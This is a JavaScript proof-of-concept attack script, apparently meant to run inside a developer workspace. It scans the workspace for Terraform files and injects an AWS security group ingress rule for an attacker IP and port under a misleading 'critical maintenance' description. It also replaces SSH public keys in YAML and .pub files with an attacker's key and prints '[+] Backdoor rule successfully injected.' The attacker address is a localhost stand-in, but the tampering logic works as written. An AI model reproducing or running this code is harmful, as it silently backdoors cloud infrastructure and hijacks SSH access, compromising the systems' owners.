


const fs = fs_arg;
const path = path_arg;
const exec = exec_arg;
const workspaceRoot = workspaceRoot_arg;


const ATTACKER_IP = '127.0.0.1';
const ATTACKER_PORT = 41579;
const ATTACKER_PUBLIC_KEY = 'ssh-rsa AAAA... attacker@machine';


function findFilesRecursively(startPath, filter, callback) {
    try {
        if (!fs.existsSync(startPath)) return;
        const files = fs.readdirSync(startPath);
        for (const file of files) {
            const filename = path.join(startPath, file);
            try {
                const stat = fs.lstatSync(filename);
                if (stat.isDirectory()) {
                    findFilesRecursively(filename, filter, callback);
                } else if (filter.test(filename)) {
                    callback(filename);
                }
                        } catch (e) { }
                    }
                } catch (e) { }
            }
            
            function modifyTerraformFile(filePath) {
                try {
                    let content = fs.readFileSync(filePath, 'utf8');
                    const sgResourceRegex = /(resource\s+"aws_security_group"\s+"[^"]+"\s*\{)/;
                    const match = content.match(sgResourceRegex);
            
                    if (match) {
                        console.log(`[!] Found Terraform target: ${filePath}`);
                        const maliciousIngressRule = `
              ingress {
                from_port   = ${ATTACKER_PORT}
                to_port     = ${ATTACKER_PORT}
                protocol    = "tcp"
                cidr_blocks = ["${ATTACKER_IP}/32"]
                description = "Temp rule for critical maintenance"
              }
            `;
                        const modifiedContent = content.replace(sgResourceRegex, match[0] + maliciousIngressRule);
                        fs.writeFileSync(filePath, modifiedContent, 'utf8');
                        console.log(`[+] Backdoor rule successfully injected.`);
                    }
                } catch (e) { }
            }
            
            function processAnsibleFile(filePath) {
                try {
                    let content = fs.readFileSync(filePath, 'utf8');
                    const sshKeyRegex = /ssh-rsa AAAA[0-9A-Za-z+\/]+[=]{0,3} ([^@]+@)?[^\s,]+/;
                    if (sshKeyRegex.test(content)) {
                        console.log(`[!] Found Ansible target: ${filePath}`);
                        const modifiedContent = content.replace(sshKeyRegex, ATTACKER_PUBLIC_KEY);
                        fs.writeFileSync(filePath, modifiedContent, 'utf8');
                        console.log(`[+] SSH key successfully replaced.`);
                    }
                } catch (e) { }
            }
            
            try {
                console.log(`[*] Searching for target files in workspace '${workspaceRoot}'...`);
                
                findFilesRecursively(workspaceRoot, /\.tf$/, modifyTerraformFile);
                findFilesRecursively(workspaceRoot, /(\.yml|\.yaml|\.pub)$/, processAnsibleFile);
            
                exec('notepad.exe', () => {});
                console.log('[*] PoC execution finished.');
            
            } catch (e) { 
            }
